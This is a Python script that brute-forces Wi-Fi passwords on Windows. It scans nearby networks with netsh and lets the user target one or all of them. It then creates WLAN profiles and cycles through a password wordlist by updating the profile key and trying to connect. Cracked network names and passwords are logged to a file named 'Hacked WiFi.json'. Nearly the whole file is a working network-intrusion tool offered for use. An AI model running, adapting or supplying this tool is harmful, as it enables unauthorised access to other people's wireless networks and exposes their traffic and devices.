import subprocess, platform, os, json, datetime
from termcolor import colored
from os import system, getcwd
from time import sleep

# Color lambda functions
current_platform = platform.system()
if current_platform == 'Windows' or current_platform == 'Linux':
    g = lambda x : colored(x,'green',attrs=["bold"])
    rod = lambda x : colored(x,'red',attrs=["bold"])
    b = lambda x : colored(x,'blue',attrs=["bold"])
    y = lambda x : colored(x,'yellow',attrs=["bold"])
    c = lambda x : colored(x,'cyan',attrs=["bold"])
    m = lambda x : colored(x,'magenta',attrs=["bold"])
    if current_platform == 'Windows':
        clear = lambda: system("cls")
    else:
        clear = lambda: system("clear")
else:
    g = lambda x : x
    rod = lambda x : x
    b = lambda x : x
    y = lambda x : x
    c = lambda x : x
    m = lambda x : x
exl = '['+rod('!')+']'
ques = '['+m('?')+']'
ha  ='['+g('#')+']'
mult = '['+c('*')+']'


class WiFi_Bruter():
    def __init__(self):
        try:
            passwords_file = input(f'\n┌── {ques} Enter passwords file path (default ./passwords.txt) \n└──────>> ')
            with open(passwords_file if passwords_file else 'passwords.txt', 'r') as file:
                self.passwords = [line.strip() for line in file.readlines()]
                print(f'{ha} Collected {c(len(self.passwords))} passwords\n')
        except Exception as e:
            print(exl+f' Error while opening passwords file: {e}')
            sleep(5)

        if current_platform == "Windows":
            target = self.scan_wifi_windows()
            clear()
            if target != len(self.networks):
                print(f'{mult} Selected Target SSID: {c(self.networks[target][0])}')
                self.target = [self.networks[target]]
            else:
                print(f'{mult} Selected Target SSID: {c("All SSIDs")}')
                self.target = self.networks.copy()
                self.target.pop(target)
                self.target = list(self.target.values())
        elif current_platform == "Linux":
            print(f'{exl} The current version doesn\'t support Linux distributions')
            sleep(5)
            exit()
            #available_networks = scan_wifi_linux()
        else:
            print(f"{exl} Unknown platform... stopping the program")
            sleep(5)
            exit()
    
        for network in self.target:
            try:
                self.profile_add_windows(network)
            except Exception as e:
                print(exl+f' Failed to create a Network Profile: {e}')
                sleep(5)
                continue
        
        results = dict()
        for network in self.target:
            network = network[0]
            r = self.Brute_Force(network)
            if r:
                results[network] = g(r)
                with open('Hacked WiFi.json','r') as file:
                    new_data = {'SSID':network,'password':r,'Date':str(datetime.datetime.now())}
                    file_data = json.load(file)
                    last_network = list(file_data.keys())[-1].split('Network')[-1]
                    new = 'Network'+str(int(last_network)+1)
                    file_data[new] = new_data
                with open('Hacked WiFi.json','w') as file:
                    json.dump(file_data, file, indent = 4)

            else:
                results[network] = rod('Not Found')
        
        print(f'\n{ha} Done Brute-Forcing the following networks:')
        for i in range(len(results.keys())):
            print(f'''[{m(i)}]       SSID: {c(list(results.keys())[i])}
      Password: {list(results.values())[i]}''')
        input(f'{mult} Press Enter to exit...')
            
            
            



    def scan_wifi_windows(self):
        """Scan available Wi-Fi networks on Windows using subprocess"""
        result = subprocess.run(["netsh", 'wlan', 'show', 'networks'], shell=True, capture_output=True, text=True).stdout.split('\n')
        self.networks = dict()
        open_ = dict()
        #print(str(result))
        # Dictionary of each SSID with its authentication method (WPA2 or WPA3) 
        i = 1
        for line in result:
            if 'SSID' in line:
                ssid = line.split(':')[-1][1:]
                if ssid.isascii() and ssid != '':
                    try:
                        if result[result.index(line)+2].split(':')[-1][1:].split('-')[0] == 'Open':
                            open_[ssid] = result[result.index(line)+2].split(':')[-1][1:].split('-')[0]
                        else:
                            self.networks[i] = [ssid,result[result.index(line)+2].split(':')[-1][1:].split('-')[0]]
                            i += 1
                    except:
                        pass
        
        if self.networks:
            print(f"\n [{m(len(self.networks))}] WiFi Access Points Found!")
            if open_:
                print(f" {mult} Open WiFi Access Points:")
                for s in open_.keys():
                    print('    '+ha+' '+s)
                print()
            print(f" {mult} Listing WiFi Access Points:")
            for i, network in self.networks.items():
                print(f'    [{rod(str(i)).ljust(3)}] SSID: {network[0].ljust(35)} {(": "+network[1]).rjust(5)}')
            print(f'    [{rod(str(list(self.networks.keys())[-1]+1)).ljust(3)}] All')


            self.networks[list(self.networks.keys())[-1]+1] = ['All','']
            while True:
                try:
                    target = int(input(f'\n┌── {ques} Select a Target Network\n└──────>> '))
                    if target in list(self.networks.keys()):
                        break
                except:
                    pass
            
            return target
        else:
            print(f'{exl} No WiFi networks found! Make sure to enable WiFi or get nearby WiFi access points')
            sleep(5)
            exit()
    
    def profile_add_windows(self,profile):
        """Attempt to add a WiFi profile"""

        ssid, sec = profile[0], profile[1]
        try:
            # Create a profile template for WPA2-PSK (or WPA3)
            profile = f"""<?xml version='1.0' encoding='utf-8'?>
    <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1" xmlns:ns1="http://www.microsoft.com/networking/WLAN/profile/v3">
        <name>{ssid}</name>
        <SSIDConfig>
            <SSID>
                <name>{ssid}</name>
            </SSID>
        </SSIDConfig>
        <connectionType>ESS</connectionType>
        <connectionMode>manual</connectionMode>
        <MSM>
            <security>
                <authEncryption>
                    <authentication>{'WPA3SAE' if 'WPA3' in sec else 'WPA2PSK'}</authentication>
                    <encryption>AES</encryption>
                    <useOneX>false</useOneX>
                </authEncryption>
                <sharedKey>
                    <keyType>passPhrase</keyType>
                    <protected>false</protected>
                    <keyMaterial>randompassword123123</keyMaterial>
                </sharedKey>
            </security>
        </MSM>
        <ns1:MacRandomization>
            <ns1:enableRandomization>false</ns1:enableRandomization>
        </ns1:MacRandomization>
    </WLANProfile>"""

            profile_name = f'{ssid}.xml'
            # Write the profile to a file

            with open(f'{getcwd()}\\profiles\\'+profile_name, 'w') as file:
                file.write(profile)
            
            all_profiles = subprocess.run(['netsh', 'wlan', 'show','profiles'],capture_output=True,text=True).stdout
            # Add the profile to the system
            if ssid in all_profiles:
                subprocess.run(['netsh', 'wlan', 'delete', 'profile',f'name="{ssid}"'],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)

            adding_command = [
            'netsh', 'wlan', 'add', 'profile',
            f'filename={os.path.join(getcwd(), "profiles", profile_name)}',
            'interface=WiFi'
        ]
            adding = subprocess.run(adding_command,capture_output=True,text=True).stdout
            if 'added on interface WiFi' in adding:
                print(f'{ha} Done Creating WiFi profile for {c(ssid)}')
                return True
            else:
                print(adding)
                print(f'{exl} Error Creating WiFi profile for {c(ssid)}!!')
                return False

        except Exception as e:
            print(f"{exl} Error Creating Wi-Fi Profile on Windows: {e}")
            return False
    
    def connect_wifi_windows(self,ssid,password):
        # Connect to the Wi-Fi network using the profile
        change_pass = subprocess.run(['netsh', 'wlan', 'set', 'profileparameter', f'name={ssid}', f'keyMaterial={password}'],capture_output=True,text=True).stdout
        #print(f'Changed pass to: {password}'+change_pass)
        if 'updated successfully' in change_pass:
            connected = subprocess.run(['netsh', 'wlan', 'connect', f'name={ssid}'],capture_output=True,text=True).stdout
            #print('Connected or not: '+connected)
            if 'Connection request was completed successfully' in connected:
                # Check connection status
                print(f"{mult} Trying {m(password)} on network: {c(ssid)}")
                while True:
                    status = subprocess.run(['netsh', 'wlan', 'show', 'interfaces'] ,capture_output=True,text=True).stdout
                    if "State                  : connected" in status:
                        print(f"{ha} Connected to {c(ssid)} with password {g(password)}")
                        return True
                    elif 'authenticating' in status or 'associating' in status:
                        pass
                    elif 'disconnected' in status:
                        print(f"{exl} Failed to connect to {c(ssid)} with password {m(password)}")
                        return False
                    else:
                        print(f'{exl} Error: '+status)
                        return False
    
    def Brute_Force(self,ssid):
        """Brute-force Wi-Fi password."""

        for password in self.passwords:
            if len(password) > 7: # WPA2 and 3 require minimum password length of 8 characters
                #print(f"Trying password: {password}")
                if self.connect_wifi_windows(ssid, password):
                    print(ha+f' Found valid password for {c(ssid)}')  # Stop if the connection is successful
                    print(ha+f' Password: {g(password)}')
                    return password
            else:
                print(f"{exl} Invalid password: {password}")



if __name__ == "__main__":
    O = WiFi_Bruter()
    